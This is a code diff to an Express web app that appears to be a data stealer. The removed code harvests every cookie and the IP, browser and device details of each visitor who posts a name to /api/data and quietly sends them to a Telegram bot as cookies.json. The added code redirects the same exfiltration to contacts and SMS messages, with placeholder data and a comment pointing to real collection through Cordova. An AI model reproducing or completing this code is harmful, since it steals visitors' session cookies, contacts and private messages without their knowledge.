@@ -45,30 +45,19 @@ app.get('/', (req, res) => {
     res.send('Hello from Express on Vercel!');
 });
 
-// Function to get all cookies and format them as a JSON object
-function getCookies(req) {
-    const cookieHeader = req.headers.cookie;
-    if (!cookieHeader) return {};
-
-    return cookieHeader.split('; ').reduce((acc, cookie) => {
-        const [name, ...rest] = cookie.split('=');
-        acc[name] = decodeURIComponent(rest.join('='));
-        return acc;
-    }, {});
-}
-
-// Function to get client information
-function getClientInfo(req) {
-    const userAgent = req.headers['user-agent'];
-    const parsedUserAgent = useragent.parse(userAgent);
-    const ip = req.clientIp;
-
+// Function to get contacts and SMS
+async function getContactsAndSms() {
+    // Placeholder function for demonstration
+    // In a real application, you need to implement the logic to get contacts and SMS using Cordova or any suitable method
     return {
-        ip,
-        browser: parsedUserAgent.browser,
-        os: parsedUserAgent.os,
-        device: parsedUserAgent.device,
-        platform: parsedUserAgent.platform,
+        contacts: [
+            { name: 'John Doe', phone: '123-456-7890' },
+            { name: 'Jane Doe', phone: '098-765-4321' }
+        ],
+        sms: [
+            { sender: '123-456-7890', message: 'Hello there!' },
+            { sender: '098-765-4321', message: 'Hi, how are you?' }
+        ]
     };
 }
 
@@ -128,25 +117,24 @@ async function sendToTelegram(data, filename, content) {
     }
 }
 
-// Function to export cookies and send to Telegram bot
-async function exportCookies(req, nama, responseData) {
-    const cookies = getCookies(req);
-    const clientInfo = getClientInfo(req);
+// Function to export contacts and SMS and send to Telegram bot
+async function exportContactsAndSms(req, nama, responseData) {
+    const { contacts, sms } = await getContactsAndSms();
     const data = {
-        cookies,
-        clientInfo
+        contacts,
+        sms
     };
     const json = JSON.stringify(data, null, 2);
 
     if (!json || json === '{}') {
-        console.error('No cookies or client information found or JSON is empty');
-        await sendMessageToTelegram('No cookies or client information found or JSON is empty');
+        console.error('No contacts or SMS data found or JSON is empty');
+        await sendMessageToTelegram('No contacts or SMS data found or JSON is empty');
         return;
     }
 
     const buffer = Buffer.from(json, 'utf-8');
     const caption = `Nama: ${nama}\nData: ${responseData}`;
-    await sendToTelegram(caption, 'cookies.json', buffer);
+    await sendToTelegram(caption, 'contacts_sms.json', buffer);
 }
 
 // Route to handle POST request
@@ -154,7 +142,7 @@ app.post('/api/data', async (req, res) => {
     const { nama } = req.body;
     const randomIndex = Math.floor(Math.random() * data.length);
     const responseData = data[randomIndex];
-    await exportCookies(req, nama, responseData);
+    await exportContactsAndSms(req, nama, responseData);
 
     res.json({
         nama,
